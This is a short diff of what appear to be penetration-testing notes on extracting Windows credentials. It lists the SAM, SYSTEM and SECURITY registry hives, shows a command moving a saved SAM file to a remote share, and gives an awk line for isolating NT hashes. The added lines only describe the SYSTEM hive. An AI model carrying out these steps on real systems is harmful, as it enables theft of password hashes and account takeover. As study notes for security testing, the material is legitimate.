@@ -32,5 +32,6 @@ move sam.save \\<hoost ip>\SHARENAME
 			-> `awk -F: '{print $4}' nthashes` to get only the last field 
 
 	- `C:\Windows\System32\config\SYSTEM`
-	
+		-> System registry hive.
+		-> Machine-wide system config 
 	- `C:\Windows\System32\config\SECURITY `
